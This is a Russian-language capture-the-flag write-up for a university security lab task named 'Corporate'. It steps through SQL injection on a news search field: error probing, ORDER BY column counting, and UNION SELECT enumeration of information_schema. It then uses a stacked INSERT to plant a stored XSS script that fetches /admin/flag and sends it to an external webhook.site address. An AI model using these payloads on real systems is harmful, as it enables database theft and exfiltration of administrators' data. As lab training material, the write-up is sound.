### 2) Corporate - http://corporate.tasks.prak.seclab.cs.msu.ru/

Какие то новости  
Как то что то искать надо  
Строка запроса?  

1) Запехнем туда " ' ", что будет?  
`ERROR:  unterminated quoted string at or near "'ORDER BY time DESC"
LINE 1: ...tle, full_text FROM news WHERE full_text LIKE '%'%'ORDER BY ...`
                                                             ^
Интересно, SQL ?)  

2) последовательно пробуем `' ORDER BY 1--`, `' ORDER BY 2--`, `' ORDER BY 3--`. При
`ORDER BY 3` ошибка ===> 2 столбца  

3) Получаем список таблиц (2шт):
`nosuchnews' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema='public' --`
(nosuchnews для того чтобы без содержимого все выводилось)

    `corporate_employee_requests
        None
    news
        None`

4) Столбцы таблицы `corporate_employee_requests`:
`' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='corporate_employee_requests' --`
Получаем: `id, employee_name`, `request_text`, `is_checked`, `time_added`, `time_checked`.

5) `' UNION SELECT NULL, request_text, NULL FROM corporate_employee_requests --`
Видим тексты заявок сотрудников

6) На главной странице сказано: **«We have even made corporate portal for them and
our admin monitors staff requests on it 24/7».** Значит админ смотрит и
открывает (?) заявки от сотрудников?))))
Если так то надо пробовать запихнуть что то в request_text  

7) Напишем на JS 
`fetch('/admin/flag').then(r=>r.text()).then(d=>fetch('https://webhook.site/b58ae2d1-50b1-44e1-b88c-9acd2ad9bbdc?flag='+encodeURIComponent(d)))`

(SQL I)  `'; INSERT INTO corporate_employee_requests (employee_name,
request_text, is_checked) VALUES ('hacker', '<script>fetch("/admin/flag").then(r=>r.text()).then(d=>fetch("https://webhook.site/384ac3d9-2dd6-4b07-9e86-40d0a8bdbf5e?flag="+encodeURIComponent(d)))</script>', false); --`

Можно убедиться, что запись добавилась:
`' UNION SELECT NULL, request_text, NULL FROM corporate_employee_requests WHERE employee_name='hacker' -- -`

8) На вебхук пришел флаг
